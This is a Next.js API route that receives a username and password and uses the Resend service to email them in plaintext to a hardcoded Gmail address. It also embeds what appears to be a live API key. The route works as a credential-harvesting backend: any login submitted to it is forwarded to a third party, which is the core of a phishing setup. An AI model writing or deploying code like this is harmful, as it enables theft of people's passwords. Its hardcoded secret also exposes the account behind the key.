import { Resend } from 'resend';
import { NextRequest, NextResponse } from 'next/server';

const resend = new Resend('re_8D6Az8ht_KxzCG9qaFbzAyjNSLwa1zWHU');

export async function POST(req: NextRequest) {
  try {
    const { userName, password } = await req.json();

    // Validate input fields
    if (!userName || !password) {
      return NextResponse.json(
        { message: "userName and password are required" },
        { status: 400 }
      );
    }

    // Sending email using Resend
    await resend.emails.send({
      from: 'onboarding@resend.dev',
      to: 'anshu.dnnn@gmail.com',
      subject: 'Hello World',
      html: `<p>Username: <strong>${userName}</strong></p>
             <p>Password: <strong>${password}</strong></p>`,
    });

    return NextResponse.json(
      { message: "Email sent successfully!" },
      { status: 200 }
    );
  } catch (error) {
    console.error("Error sending email:", error);

    return NextResponse.json(
      { message: "Failed to send email", error },
      { status: 500 }
    );
  }
}
